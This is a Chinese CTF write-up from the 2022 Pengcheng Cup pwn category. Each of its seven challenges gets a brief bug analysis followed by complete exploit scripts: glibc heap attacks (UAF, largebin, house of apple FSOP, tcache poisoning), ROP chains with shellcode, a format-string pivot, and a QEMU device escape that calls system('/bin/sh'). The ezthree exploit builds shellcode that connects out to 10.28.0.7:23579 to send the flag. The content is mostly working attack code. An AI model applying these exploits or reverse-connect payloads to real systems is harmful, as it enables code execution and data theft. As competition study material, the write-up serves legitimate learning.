# 2022-鹏程杯-ctf-pwn



# 2022-鹏程杯-ctf-pwn

简单复盘与总结一下，`qemu`逃逸的题目还有点意思，其他都是常规题。附件下载[链接](https://download.roderickchan.cn/ctf/2022/2022pcl.7z)

<!-- more -->

## A_fruit

### 题目分析

在`delete`分支有`UAF`：

![image-20220706192212407](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220706192212407.png)

### 利用思路

考虑到题目中存在`exit`，且可以进行`1`次`largebin attack`，因此直接用我提出的[house of apple](https://roderickchan.github.io/2022/06/17/House-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADIO%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/)套现有的脚本模板去解题。

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


def add(size):
    sla("5.Exit\n", "1")
    sla("Input size:\n", str(size))


def edit(i, data):
    sla("5.Exit\n", "2")
    sla("Input index:\n", str(i))
    sa("Input content:", data)


def show(i):
    sla("5.Exit\n", "3")
    sla("Input index:\n", str(i))
    m = rs(2)
    m = [int16_ex(x) for x in m]
    log_ex(f"Get msg: {m}")
    return m

def dele(i):
    sla("5.Exit\n", "4")
    sla("Input index:\n", str(i))


add(0x410) # 0
add(0x420) # 1
add(0x420) # 2
add(0x410) # 3
dele(0)
a1, a2 = show(0)

_p = process(["./calc", str(a1)])
data = _p.recvline_startswith("find", timeout=300)
_p.close()

a1 = int16_ex(data[6:])

_p = process(["./calc", str(a2)])
data = _p.recvline_startswith("find", timeout=120)
_p.close()
a2 = int16_ex(data[6:])
leak_addr = (a2 << 32) + a1
log_address("leak addr", leak_addr)

libc_base = set_current_libc_base_and_log(leak_addr, 0x1e0c00)

dele(2)

a1, a2 = show(2)

_p = process(["./calc", str(a1)])
data = _p.recvline_startswith("find", timeout=300)
_p.close()

a1 = int16_ex(data[6:])

_p = process(["./calc", str(a2)])
data = _p.recvline_startswith("find", timeout=120)
_p.close()
a2 = int16_ex(data[6:])
leak_addr = (a2 << 32) + a1
log_address("leak addr", leak_addr)

heap_base = leak_addr - 0x290
log_address("heap base", heap_base)

add(0x410) # 4
add(0x430) # 5

dele(4)

# largebin attack
target_addr = libc.sym._IO_list_all
edit(2, flat(0, 0, 0, target_addr - 0x20))

add(0x430)

fake_IO_addr = heap_base + 0x290
chain = fake_IO_addr + 0x120
_lock = libc_base + 0x1e3660
point_guard_addr = libc_base + 0x1ed5b0
_IO_wstrn_jumps = libc_base + 0x1e1c60
_IO_cookie_jumps = libc_base + 0x1e1a20

f1 = IO_FILE_plus_struct()
f1._IO_write_base = 0
f1._IO_write_ptr = 1
f1.chain = chain
f1._flags2 = 8
f1._mode = 0
f1._lock = _lock
f1._wide_data = point_guard_addr
f1.vtable = _IO_wstrn_jumps

f2 = IO_FILE_plus_struct()
f2._IO_write_base = 0
f2._IO_write_ptr = 1
f2._lock = _lock 
f2._mode = 0
f2._flags2 = 8
f2.vtable = _IO_cookie_jumps + 0x58

now_pointer = heap_base + 0x380

# 0x000000000010822d: add rsp, 0x30; pop rbx; ret; 
# 0x0000000000059020: mov rsp, rdx; ret;
# 0x000000000014a0a0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; 
# 0x0000000000028a55: pop rdi; ret; 
# 0x000000000002a4cf: pop rsi; ret; 
# 0x00000000000c7f32: pop rdx; ret;
magic_gadget = libc_base + 0x000000000014a0a0

data = flat({
    0: bytes(f1)[0x10:],
    0x110: {
        0: bytes(f2),
        0xe0: [heap_base + 0x4a0, rol(magic_gadget ^ now_pointer, 0x11),
        [
            libc_base + 0x000000000010822d,  # 0x4a0
            heap_base + 0x4a0,
            0, 0,
            0x0000000000059020 + libc_base,
            0, 0,
            0, 
            [
            0x0000000000028a55 + libc_base,
            heap_base,
            0x000000000002a4cf + libc_base,
            0x10000,
            libc_base + 0x00000000000c7f32,
            7,
            libc.sym.mprotect,
            fake_IO_addr+0x300,
            ]
        ]
        ]
    },
    0x2f0: ShellcodeMall.amd64.cat_flag
})

edit(4, data)

sla("5.Exit\n", "5")

ia()
```

当然，需要手写一个`calc.c`去计算地址：

```c
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>

void func(uint32_t start, uint32_t end, uint32_t num)
{
    uint32_t x = start;
    while (x < end) {
        uint32_t a1 = x;
        for (int i = 0xA; i > 0; --i )
            a1 ^= ((a1 ^ (0x30 * a1)) >> 0x15) ^ (0x30 * a1) ^ ((a1 ^ (0x30 * a1) ^ ((a1 ^ (0x30 * a1)) >> 0x15)) << 0x11);
        if (a1 == num) {
            printf("find: 0x%x\n", x);
        }
        ++x;
    }
}

int main(int argc, char **argv, char**env)
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    uint32_t num = (uint32_t)atoi(argv[1]);
    printf("num: %u\n", num);
    int p1, p2, p3;
    p1 = fork();
    if (p1 == 0) {
        func(0, 0x40000000, num);
        exit(0);
    } else {
        p2 = fork();
        if (p2 == 0) {
            func(0x40000000, 0x80000000, num);
            exit(0);
        } else {
            p3 = fork();
            if (p3 == 0) {
                func(0x80000000, 0xc0000000, num);
                exit(0);
            } else {
                func(0xc0000000, 0xffffffff, num);
            }
        }
    }
    waitpid(0);
    return puts("done!");
}
```



## fruitshop

### 题目分析

同样在`delete`分支有`UAF`，被释放后可以继续写和读。

![image-20220706192611025](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220706192611025.png)

### 利用思路

仍然利用`house of apple`去拿`shell`。

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

apple = "Apple"  # 0xdd0 malloc   3 个
banana = "Banana" # 0xcb0 malloc  5 个
cherry = "Cherry" # 0xe50  malloc 4 个
durian = "Durian" # 0x110 calloc  5 个

def get_fruit(fr, i, data=None):
    if not data:
        data = fr
    sla("> ", "1")
    sla("choose a fruit(new):\n", fr)
    sla("index:\n", str(i))
    sa("Content:\n", data)


def cook_fruit(fr, i, d1, d2=None, d3=None, d4=None):
    sla("> ", "2")
    sla("choose a fruit(edit):\n", fr)
    sla("idx:\n", str(i))
    if fr == apple:
        sa("Do~\n", d1)
        sa("Re~\n", d2)
        sa("Mi~\n", d3)
        sa("Fa~\n", d4)
    else:
        sa("Content:\n", d1)


def taste_fruit(fr, i, n=0x20):
    sla("> ", "3")
    sla("choose a fruit(show):\n", fr)
    sla("idx:\n", str(i))
    ru("Content is")
    m = rn(n)
    log_ex(f"Get msg: {m}")
    return m


def throw_fruit(fr, i):
    sla("> ", "4") 
    sla("choose a fruit(delete):\n", fr)
    sla("idx:\n", str(i))

# leak glibc addr
get_fruit(banana, 0)
get_fruit(cherry, 0)
get_fruit(banana, 1)
get_fruit(cherry, 1)

throw_fruit(banana, 0)
throw_fruit(banana, 1)

m = taste_fruit(banana, 0, 0x10)
libcaddr = u64_ex(m[:8])
heapaddr = u64_ex(m[8:])
log_address_ex("libcaddr")
log_address_ex("heapaddr")

libc_base = set_current_libc_base_and_log(libcaddr, 0x1ecbe0)
heap_base = heapaddr - 0x1db0
log_address("heapbase", heap_base)

throw_fruit(cherry, 0)
throw_fruit(cherry, 1)

get_fruit(apple, 0)
get_fruit(cherry, 2)
get_fruit(apple, 1)
get_fruit(cherry, 3)
get_fruit(apple, 2)

for i in range(5):
    get_fruit(durian, 0)
    throw_fruit(durian, 0)

throw_fruit(apple, 0)
get_fruit(banana, 0)
get_fruit(cherry, 0)

throw_fruit(apple, 1)
get_fruit(banana, 1)
get_fruit(cherry, 1)

cook_fruit(apple, 1,  flat(0, 0x121, heap_base + 0xf50, libc_base + 0x1eeea0-0x10), "deadbeef", flat(0, 0x121, heap_base + 0xf50, heap_base + 0x1ee0), "deadbeef")
get_fruit(durian, 1)

cook_fruit(apple, 0,  "deadbeef", "deadbeef", flat(0, 0x1440), "deadbeef")
cook_fruit(banana, 1,  flat({0x4b0:[0, 0x21, 0, 0]*2}))

throw_fruit(durian, 1)

fake_IO_addr = heap_base + 0xf50
chain = heap_base + 0x1080
_lock = libc_base + 0x1ee7d0
point_guard_addr = libc_base + 0x1f3570
_IO_wstrn_jumps = libc_base + 0x1e8c60
_IO_cookie_jumps = libc_base + 0x1e8a20

f1 = IO_FILE_plus_struct()
f1._IO_write_base = 0
f1._IO_write_ptr = 1
f1.chain = chain
f1._flags2 = 8
f1._mode = 0
f1._lock = _lock
f1._wide_data = point_guard_addr
f1.vtable = _IO_wstrn_jumps

now_pointer = heap_base + 0x1040
f2 = IO_FILE_plus_struct()
f2._IO_write_base = 0
f2._IO_write_ptr = 1
f2._lock = _lock 
f2._mode = 0
f2._flags2 = 8
f2.vtable = _IO_cookie_jumps + 0x58

cook_fruit(durian, 1, bytes(f1)[0x10:])
cook_fruit(cherry, 2, bytes(f2) + flat(libc.search(b"/bin/sh").__next__(), rol(libc.sym.system ^ now_pointer, 0x11)))

sla("> ", "quit")

ia()
```



## one

### 题目分析

给了栈地址，之后还能泄露出`pie`基址。但是`close(1)`了，所以采用`byte`写入数据。

### 利用思路

- 修改`rbp`和`ret_addr`，做栈迁移
- 修改`stdout`指向`_IO_2_1_stderr`
- 利用`printf`泄露地址
- 利用`ret2csu`做栈`rop`

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

ru("gift:")
m = rl()
stack_addr = int16(m)
log_address("stack addr", stack_addr)

sa("username:", "a"*8)
sa("password:", "a"*8)
ru("Hello ")
m = rl()
start_addr = u64_ex(m[8:-1])
codebase = set_current_code_base_and_log(start_addr, 0x11a0)

offset=6
rbp = stack_addr + 0x810

data = fmtstr_payload(offset=6, writes={rbp:stack_addr+0x118, rbp+8:codebase+0x14D7}, write_size_max="byte", write_size="byte")

CurrentGadgets.set_find_area()
sa("Now, you can't see anything!!!\n", flat([
    data,
    CurrentGadgets.write_by_magic(codebase+0x4020, 0x7ffff7f986a0, 0x7ffff7f985c0),
    CurrentGadgets.pop_rdi_ret(),
    elf.got.read,
    elf.plt.printf,
    codebase + 0x153A,
    0, 1,
    0, stack_addr + 0x170, 0x500,
    elf.got.read,
    codebase + 0x1520
]))

libc_base = set_current_libc_base_and_log(recv_current_libc_addr(), "read")

s(flat({0:[
    [CurrentGadgets.ret()]*0x20,
    CurrentGadgets.pop_rdi_ret(),
    stack_addr &~0xfff,
    CurrentGadgets.pop_rsi_r15_ret(),
    0x4000, 0,
    0x0000000000142c92 + libc_base, 7,
    libc.sym.mprotect,
    stack_addr + 0x300,
    "\x90"*0x100, 
    asm(shellcraft.cat("flag.txt", 2))
]}))


ia()
```



## ezthree

### 题目分析

一个是`rw`属性的内存块，可以写入以下指令：

```
ret
jmp
movrax
nop
zero
```

一个是`rwx`的指令，但是只能写`0x28`字节，且写入后直接`close 0/1/2`了。

由于在分配`rw`内存的时候，有这样一句：

![image-20220706204009690](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220706204009690.png)

所以可以从`0x100000000000`开始爆破。

### 利用思路

- 利用`nonsleep`的返回值来扫描内存
- 扫描到`rw`内存后，直接修改其权限为`rwx`
- 提前在`rw`区域布置好`shellcode`，可以利用`jmp short`和`movrax`要输入的`8`个字节去构造
- 使用`reverse tcp`反向连接读取`flag`

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

sla("INput >> ", "a"*(0x30))

# ret jmp movrax nop zero
rt = "ret"
j = "jmp"
mr = "movrax"
n = "nop"
z = "zero"
q = "quit"


payload = generate_payload_for_connect("10.28.0.7", 23579)

data_tmp = [
    "\x02",
    asm("lea rsp, [rip+0x800]"), # lea rsp, [rip+0x800]
    "\x02",
    asm("xor ebx, ebx; xor esi, esi; xor edx, edx; push rbx"), # xor ebx, ebx; push rbx
    "flag.txt",
    "\x02",
    asm("push rax; push rsp; pop rdi; xor eax, eax"),
    "\x02",
    asm("mov al, 2;syscall;mov al, 2; push rax"), # open flag
    "\x02",
    asm("pop rdi; mov al, 1; push rax; pop rsi"),
    "\x02",
    asm("mov al, 41;syscall;mov rdi, rax;push rdx"),
    payload[:8],
    "\x02",
    asm("push rax; push rsp; pop rsi; mov dl, 0x10"),
    "\x02",
    asm("xor eax, eax; mov al, 42;syscall"),
    "\x02",
    asm("xor eax, eax;mov rsi,rsp; mov dl, 0x60"),
    "\x02",
    asm("xor edi, edi; syscall;inc edi"),
    "\x02",
    asm("xor eax, eax; mov al, 1;syscall")
]

data = []
for x in data_tmp:
    if x == "\x02":
        data.append(j)
    else:
        data.append(mr)

data.append(q)

data2 = []
for x in data_tmp:
    assert len(x) <= 8, f"{len(x)}, x is {x}"
    pad = "\x00"
    if isinstance(x, bytes):
        pad = b"\x00"
    if x != "\x02" and len(x) < 8:
        pad = "\x90"
        if isinstance(x, bytes):
            pad = b"\x90"
    print(type(x), type(pad), x, pad)
    x = x.ljust(8, pad)
    tmp = u64(x)
    if tmp > 0x7fffffffffffffff:
        tmp -= (1 << 64)
    data2.append(str(tmp))

idx = 0
for x in data:
    sla("code > ", x)
    if x == mr or x == j:
        sl(data2[idx])
        idx += 1

print(f"data: {data}")
print(f"data2: {data2}")

sc = """
inc edi
sal rdi, 0x2c
L1:
add rdi, 0x1000
xor eax, eax
mov al, 35
syscall
cmp al, 0xea
jne L1
mov bh, 0x10
mov esi, ebx
mov dl, 7
xor eax, eax
mov al, 10
syscall
jmp rdi
"""

sa("You want to do sometings ?\n", asm(sc))

ia()
```



## rainbowcat

### 题目分析

似乎是加了花指令导致`IDA`反编译基本失效，不过好在题目不复杂，可以通过简单的测试得到所有功能。

测试之后发现四个功能：

```
1.add
固定malloc(0x10)，index在0-2之间，可以无限制add，但是会检查地址是不是堆地址，如果想分配到栈、libc上就会失败

2.dele
存在UAF

3.show

4.edit
```

### 利用思路

- 存在`UAF`，所以首先泄露地址
- 然后修改`chunk size`伪造`largebin chunk`
- 然后进行`largebin attack`修改`_IO_list_all`
- 使用`tache poision attack`任意地址写`0x10`字节，在堆上布局`_IO_FILE`
- 使用`house of apple`进行`orw`读取`flag`

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

def add(i):
    sla("Your choice >> ", "1")
    sla("Which cat do you want to get? ", str(i))


def dele(i):
    sla("Your choice >> ", "2")
    sla("Which one do you want to abandon? ", str(i))


def show(i):
    sla("Your choice >> ", "3")
    sla("Choose a cat to show name: ", str(i))
    ru("Name:")
    m = rn(0x10)
    info(f"get msg: {m}")
    return m

def edit(i, data):
    sla("Your choice >> ", "4")
    sla("Which one?", str(i))
    sa("Rename the cat: ", data)

add(0)
dele(0)
m = show(0)
heap_base = u64_ex(m[-8:]) - 0x10
log_address_ex("heap_base")

add(0)
add(1)

for i in range(0x30):
    add(2)

dele(1)
dele(0)

edit(0, flat((heap_base + 0x290)^(heap_base >> 12), 0))
add(2)
add(2)
edit(2, flat(0, 0x421))

dele(0)
m = show(0)
libc_addr = u64_ex(m[:8])
libc_base = set_current_libc_base_and_log(libc_addr, 0x1e0c00)
target_addr = libc.sym._IO_list_all

add(1)
add(1)
add(1)

edit(2, flat(0, 0x461))
dele(0)

add(1)
add(0)
add(2)

dele(1)
dele(0)

edit(0, flat((heap_base + 0x2b0)^(heap_base >> 12), 0))
add(0)
add(0)
edit(0, flat(0, target_addr-0x20))

add(0)
dele(0)
edit(0, flat(0, 0))
dele(0)
edit(0, flat((heap_base + 0x330)^(heap_base >> 12), 0))

add(0)
add(0)
edit(0, flat(0, 0x441))

dele(2)
add(0)

def write_addt_0x10(addr, data):
    edit(1, flat(0, 0))
    dele(1)
    edit(1, flat(0, 0))
    dele(1)
    edit(1, flat(addr^(heap_base >> 12), 0))
    add(0)
    add(0)
    edit(0, data)

fake_IOFILE = heap_base + 0x330
fake_IOFILE2 = fake_IOFILE + 0x40

lock = libc_base + 0x1e3660
_IO_wstrn_jumps  = libc_base + 0x1e1c60
_IO_cookie_jumps = libc_base + 0x1e1a20
point_guard_addr = libc_base + 0x1ed5b0
new_pointer_guard = fake_IOFILE + 0xf0

write_addt_0x10(fake_IOFILE + 0x60, flat(0, fake_IOFILE2))
write_addt_0x10(fake_IOFILE + 0x70, flat(8 << 32, 0))
write_addt_0x10(fake_IOFILE + 0x80, flat(0, lock))
write_addt_0x10(fake_IOFILE + 0xa0, flat(point_guard_addr, 0))
write_addt_0x10(fake_IOFILE + 0xd0, flat(0, _IO_wstrn_jumps))

write_addt_0x10(fake_IOFILE2 + 0x70, flat(8 << 32, 0))
write_addt_0x10(fake_IOFILE2 + 0x80, flat(0, lock))
write_addt_0x10(fake_IOFILE2 + 0xd0, flat(0, _IO_cookie_jumps+0x58))

"""
0x000000000014a0a0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
0x0000000000059020: mov rsp, rdx; ret;
0x000000000010822d: add rsp, 0x30; pop rbx; ret;
0x0000000000028a55: pop rdi; ret;
0x000000000002a4cf: pop rsi; ret; 
0x00000000000c7f32: pop rdx; ret;
"""
CurrentGadgets.set_find_area(0, 1)

fake_rdx = fake_IOFILE + 0x200
gadget_addr = CurrentGadgets.find_gadget('mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];','asm')
write_addt_0x10(fake_IOFILE2 + 0xe0, flat(fake_rdx, rol(gadget_addr ^ new_pointer_guard, 0x11)))

write_addt_0x10(fake_rdx, flat(CurrentGadgets.find_gadget('add rsp, 0x30; pop rbx; ret;','asm'), fake_rdx))
write_addt_0x10(fake_rdx+0x20, flat(CurrentGadgets.find_gadget('mov rsp, rdx; ret;','asm'), 0))
write_addt_0x10(fake_rdx+0x40, flat(CurrentGadgets.pop_rdi_ret(), heap_base))
write_addt_0x10(fake_rdx+0x50, flat(CurrentGadgets.pop_rsi_ret(), 0x10000))
write_addt_0x10(fake_rdx+0x60, flat(CurrentGadgets.pop_rdx_ret(), 7))
write_addt_0x10(fake_rdx+0x70, flat(libc.sym.mprotect, fake_rdx+0x80))

sc = asm(shellcraft.cat("flag.txt"))

mod = len(sc) % 0x10

if mod:
    sc += b"\x90" * (0x10 - mod)

for i in range(len(sc) // 0x10):
    write_addt_0x10(fake_rdx+0x80 + 0x10 * i, sc[0x10 * i: 0x10 * i + 0x10])

# to exit
edit(1, flat(0, 0))
dele(1)
edit(1, flat(0, 0))
dele(1)
edit(1, flat(libc.sym.__free_hook^(heap_base >> 12), 0))
add(0)
add(0)

ia()
```



## arm-protocol

### 题目分析

数据包的大小为`0x58`，从`+0x4b`开始输出的值会拿去做`md5`运算，然后只需要满足其`md5`的前`3`个字符是`\x4d\x89\x00`即可，爆破一下就能得到一串输入绕过`md5`的校验。

然后会有数据包的校验和检查。

在`edit`的时候，有`off by one`，因为是先赋值，后判断的：

![image-20220706205439387](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220706205439387.png)

逆向出数据结构为：

```c
struct Note
{
  void *func_ptr;
  void *data_addr;
  char data[0];
};
```

### 利用思路

- `libc-2.27`有`tcache`，修改`chunk size`，然后修改`func_ptr`和`data_addr`泄露出`libc`地址
- 第二次伪造修改为`system`和`/bin/sh`地址即可

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

# run cmd: ./exp.py qemu ./arm_protocol
# debug cmd: ./exp.py qemu ./arm_protocol -t -b 0x126dc

from pwncli import *

cli_script()

io: tube = gift['io']
libc = ELF("./libc-2.27.so")

def add(size):
    assert size > 0 and size <= 0x70
    data = flat_z({
        0: 0x11451400,
        4: size,
        8: size,
        0x4b:b'A\x01\x01\x01\x01\x01\x01\x01\x01\x01\x039\xc0',
    }, length=0x58)
    sa("Input code>\n", data)

def show(idx):
    data = flat_z({
        0: 0x11451400,
        4: idx,
        0xc: idx,
        0x49: '\x01',
        0x4b:b'A\x01\x01\x01\x01\x01\x01\x01\x01\x01\x039\xc0',
    }, length=0x58)
    sa("Input code>\n", data)


def dele(idx):
    data = flat_z({
        0: 0x11451400,
        4: idx,
        0xc: idx,
        0x48: '\x01',
        0x4b:b'A\x01\x01\x01\x01\x01\x01\x01\x01\x01\x039\xc0',
    }, length=0x58)
    sa("Input code>\n", data)


def edit(idx, payload):
    assert len(payload) < 0x3a
    check_sum = idx
    for x in payload:
        tmp = x
        if isinstance(payload, str):
            tmp = u8(x)
        if tmp:
            check_sum ^= tmp
        else:
            break
    data = flat_z({
        0: 0x11451400,
        4: check_sum,
        8: 0, # 2
        0xc: idx,
        0x10: payload,
        0x4a: '\x01',
        0x4b:b'A\x01\x01\x01\x01\x01\x01\x01\x01\x01\x039\xc0',
    }, length=0x58)
    sa("Input code>\n", data)

add(0xc)
add(0xc)
add(0xc)

edit(0, "x"*0xc+"\x31")

dele(1)
add(0x24)

edit(1, p64(0)+p32(0)+p32(0x19)+p32(0x00012418)+p32(0x23010)+b"\n")

show(2)
libc_addr = u32(rn(4))
libc_base = libc_addr - 0xc85e0
libc.address = libc_base
log_address_ex("libc_base")

edit(1, p64(0)+p32(0)+p32(0x19)+p32(libc.sym.system)+p32(libc.search(b"/bin/sh").__next__())+b"\n")

show(2)

ia()
```

## pchsdhci

### 题目分析

这是最麻烦的一道题，足足做了一天才磨出来。主要还是对`sd`卡协议不是很清楚，靠着源码一步一步调试出来的。

### 利用思路

需要注意的有：

- 需要配置`pci`的`0xcfc`端口，开启`dma`传输
- 需要利用`sd`卡去读数据
- 最后在访问物理内存的时候，伪造`MemoryRegion->ops`的`valid`指针，伪造`opaque`指针，可以调用执行任意代码

### EXP

```c
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <assert.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include<sys/io.h>

/* R/W SDMA System Address register 0x0 */
#define SDHC_SYSAD                     0x00

/* R/W Host DMA Buffer Boundary and Transfer Block Size Register 0x0 */
#define SDHC_BLKSIZE                   0x04

/* R/W Blocks count for current transfer 0x0 */
#define SDHC_BLKCNT                    0x06

/* R/W Command Argument Register 0x0 */
#define SDHC_ARGUMENT                  0x08

/* R/W Transfer Mode Setting Register 0x0 */
#define SDHC_TRNMOD                    0x0C
#define SDHC_TRNS_DMA                  0x0001
#define SDHC_TRNS_BLK_CNT_EN           0x0002
#define SDHC_TRNS_ACMD12               0x0004
#define SDHC_TRNS_ACMD23               0x0008 /* since v3 */
#define SDHC_TRNS_READ                 0x0010
#define SDHC_TRNS_MULTI                0x0020
#define SDHC_TRNMOD_MASK               0x0037

/* R/W Command Register 0x0 */
#define SDHC_CMDREG                    0x0E
#define SDHC_CMD_RSP_WITH_BUSY         (3 << 0)
#define SDHC_CMD_DATA_PRESENT          (1 << 5)
#define SDHC_CMD_SUSPEND               (1 << 6)
#define SDHC_CMD_RESUME                (1 << 7)
#define SDHC_CMD_ABORT                 ((1 << 6)|(1 << 7))
#define SDHC_CMD_TYPE_MASK             ((1 << 6)|(1 << 7))
#define SDHC_COMMAND_TYPE(x)           ((x) & SDHC_CMD_TYPE_MASK)

/* ROC Response Register 0 0x0 */
#define SDHC_RSPREG0                   0x10
/* ROC Response Register 1 0x0 */
#define SDHC_RSPREG1                   0x14
/* ROC Response Register 2 0x0 */
#define SDHC_RSPREG2                   0x18
/* ROC Response Register 3 0x0 */
#define SDHC_RSPREG3                   0x1C

/* R/W Buffer Data Register 0x0 */
#define SDHC_BDATA                     0x20

/* R/ROC Present State Register 0x000A0000 */
#define SDHC_PRNSTS                    0x24
#define SDHC_CMD_INHIBIT               0x00000001
#define SDHC_DATA_INHIBIT              0x00000002
#define SDHC_DAT_LINE_ACTIVE           0x00000004
#define SDHC_IMX_CLOCK_GATE_OFF        0x00000080
#define SDHC_DOING_WRITE               0x00000100
#define SDHC_DOING_READ                0x00000200
#define SDHC_SPACE_AVAILABLE           0x00000400
#define SDHC_DATA_AVAILABLE            0x00000800
#define SDHC_CARD_PRESENT              0x00010000
#define SDHC_CARD_DETECT               0x00040000
#define SDHC_WRITE_PROTECT             0x00080000

unsigned char* mmio_mem;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem + addr));
}

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

int g_fd;

uint32_t page_offset(uint32_t addr)
{
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr)
{
    uint64_t pme, gfn;
    size_t offset;
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(g_fd, offset, SEEK_SET);
    read(g_fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    return gfn;
}

uint64_t gva_to_gpa(void *addr)
{
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

void hexdump(void *addr, size_t len)
{

    len &= ~0xf;
    char buf[0x400];
    int printf_len;
    char *tmp;
    for (size_t i = 0; i < len / 0x10; i++)
    {
        memset(buf, 0, 0x400);
        printf_len = 0;

        tmp = (char *)addr + i * 0x10;
        printf_len = sprintf(&buf[printf_len], "+%04x %p: ", i * 0x10, tmp);
        for (size_t j = 0; j < 0x10; j++)
        {
            printf_len += sprintf(&buf[printf_len], "%02x ", (uint8_t)tmp[j]);
        }

        printf_len += sprintf(&buf[printf_len], "| ");
        for (size_t j = 0; j < 0x10; j++)
        {
            char _c = tmp[j];
            if (!isprint(_c))
            {
                _c = '.';
            }
            printf_len += sprintf(&buf[printf_len], "%c", _c);
        }

        puts(buf);
    }
}


void prepare_work()
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    
    int _fd = open("/sys/devices/pci0000:00/0000:00:04.0/config", O_RDWR | O_SYNC);
    if (_fd < 0) {
        die("open config error!");
    }
    uint16_t data=0x107;
    lseek(_fd, 4, 0);
    write(_fd, &data, 2);
    close(_fd);

    g_fd = open("/proc/self/pagemap", O_RDONLY);
    if (g_fd < 0) {
        die("open /proc/self/pagemap!");
    }
    // Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("[*] mmio_mem: %p\n", mmio_mem);
    puts("[+] prepare work done!");
}

void main()
{
    prepare_work();
    char *buffer = malloc(0x1000);
    memset(buffer, 'a', 0x200);
    uint64_t buffer_phaddr = gva_to_gpa(buffer);
    printf("[*] buffer phaddr: 0x%lx\n", buffer_phaddr);

    mmio_write(SDHC_BLKSIZE, (3 << 16) | 0x200);
    mmio_write(SDHC_TRNMOD, ((6 << 8) << 16) | 0);
    mmio_write(SDHC_TRNMOD, ((12 << 8) << 16) | 0);
    mmio_write(SDHC_ARGUMENT, 0x1000);
    mmio_write(SDHC_TRNMOD, ((24 << 8) << 16) | 0);
    mmio_write(SDHC_SYSAD, buffer_phaddr);

    mmio_write(SDHC_TRNMOD, ((1 << 8) << 16) | SDHC_TRNS_READ);
    mmio_write(SDHC_TRNMOD, ((17 << 8) << 16) | SDHC_TRNS_READ);
    mmio_write(SDHC_SYSAD, buffer_phaddr);

    size_t *tmp = (size_t *)(buffer+6);
    // for (size_t i = 0; i < 0x200 / 8; i++)
    // {
    //     size_t val = tmp[i];
    //     if (val > ((size_t)1 << 32)) {
    //         printf("[*] idx: %d,leak addr: 0x%lx\n",i, val);
    //     }
    // }
    size_t sdhci_mmio_ops_addr = tmp[42];
    size_t codebase_addr = sdhci_mmio_ops_addr - 0xc7fe00;// - 0xc0df20;
    size_t cur_sdhcistate_addr = tmp[43];
    
    printf("[+] leak codebase address: 0x%lx\n", codebase_addr);
    printf("[+] leak SDHCIState address: 0x%lx\n", cur_sdhcistate_addr);
    int system_plt_offset = 0x2ebc20; // 0x2d52f0;
    size_t system_addr = codebase_addr + system_plt_offset;
    size_t fake_ops = cur_sdhcistate_addr + 0xb88;
    tmp[42] = fake_ops;
    tmp[43] = fake_ops+0x40;
    tmp[0] = system_addr;
    tmp[1] = system_addr;
    tmp[2] = 0x6161616161616161;
    tmp[3] = 0x6262626262626262;
    tmp[4] = 2;
    tmp[5] = 0x400000001;
    tmp[6] = 0x6363636363636363;
    tmp[7] = system_addr;
    strcpy(&tmp[8], "/bin/sh");

    mmio_write(SDHC_TRNMOD, SDHC_TRNS_MULTI | SDHC_TRNS_BLK_CNT_EN);
    mmio_write(SDHC_SYSAD, buffer_phaddr);

    mmio_read(SDHC_SYSAD);

}
```



## 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

